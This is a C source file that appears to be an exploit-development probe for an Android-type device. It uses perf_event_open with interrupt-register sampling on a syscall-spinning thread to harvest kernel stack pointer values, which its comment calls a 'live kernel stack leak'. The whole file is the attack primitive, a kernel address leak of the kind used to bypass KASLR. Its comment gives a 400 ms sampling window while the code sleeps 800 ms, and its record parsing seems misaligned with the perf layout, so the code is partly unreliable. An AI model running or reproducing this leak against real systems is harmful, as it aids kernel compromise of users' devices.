/* dev_perf_sp: perf SP-leak trial on o1s (asus-i005 sample_sp_top port).
 * Spawns a spinner thread, opens perf_event (SW_CPU_CLOCK,
 * SAMPLE_IP|TID|REGS_INTR, SP|PC) on its tid, samples 400ms, prints
 * mode-SP of kernel-stack samples + E-SP depth. Oracle: any
 * 0xffffffc0... SP = live kernel stack leak (no gdb needed!). */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#ifndef SYS_perf_event_open
#define SYS_perf_event_open 241
#endif
#define PERF_EVENT_IOC_ENABLE _IO('$', 0)
#define PERF_EVENT_IOC_DISABLE _IO('$', 1)

static volatile int storm = 1, spin_tid;

static void *spinner(void *arg)
{
    (void)arg;
    spin_tid = (int)syscall(SYS_gettid);
    while (storm) {
        syscall(SYS_getpid);
        syscall(SYS_gettid);
        syscall(172);
        syscall(SYS_getppid);
        syscall(173, 0);
    }
    return NULL;
}

int main(void)
{
    pthread_t t;
    struct perf_event_attr attr;
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
    printf("dev_perf_sp: perf SP leak trial\n");
    pthread_create(&t, NULL, spinner, NULL);
    while (!spin_tid)
        sched_yield();
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.sample_period = 100;
    attr.sample_type =
        PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
    attr.sample_regs_intr = (1ULL << 31) | (1ULL << 32);
    attr.exclude_user = 1;
    attr.exclude_kernel = 0;
    attr.disabled = 1;
    attr.wakeup_events = 1;
    errno = 0;
    int fd = syscall(SYS_perf_event_open, &attr, spin_tid, -1, -1, 0);
    printf("perf_open: fd=%d errno=%d\n", fd, errno);
    if (fd < 0) {
        printf("dev_perf_sp: PERF BLOCKED\n");
        storm = 0;
        return 2;
    }
    size_t bsz = 4096 * 9;
    void *map =
        mmap(NULL, bsz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    printf("mmap: %p\n", map);
    if (map == MAP_FAILED) {
        storm = 0;
        return 2;
    }
    volatile uint64_t *head = (volatile uint64_t *)((char *)map + 1024);
    volatile uint64_t *tail = (volatile uint64_t *)((char *)map + 1032);
    *tail = 0;
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(800000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    __sync_synchronize();
    uint64_t avail = *head - *tail, off = 0, n = 0, ksp = 0;
    uint8_t *data = (uint8_t *)map + 4096;
    uint64_t size = bsz - 4096;
    while (avail >= 8 && n < 500) {
        uint32_t type;
        uint16_t bsz2;
        memcpy(&type, data + off, 4);
        memcpy(&bsz2, data + off + 6, 2);
        if (bsz2 < 8 || bsz2 > avail)
            break;
        if (type == PERF_RECORD_SAMPLE) {
            uint64_t s = off + 8, abi, sp;
            uint32_t tid;
            s += 8;
            memcpy(&tid, data + s, 4);
            s += 4;
            memcpy(&abi, data + s, 8);
            s += 8;
            memcpy(&sp, data + s, 8);
            if ((int)tid == spin_tid && abi == 2 &&
                (sp & 0xffff000000000000ULL) == 0xffff000000000000ULL) {
                n++;
                if (!ksp)
                    ksp = sp;
            }
        }
        off = (off + bsz2) % size;
        avail -= bsz2;
    }
    printf("dev_perf_sp: kstack_samples=%llu first_sp=%#llx\n",
           (unsigned long long)n, (unsigned long long)ksp);
    storm = 0;
    pthread_join(t, NULL);
    return 0;
}
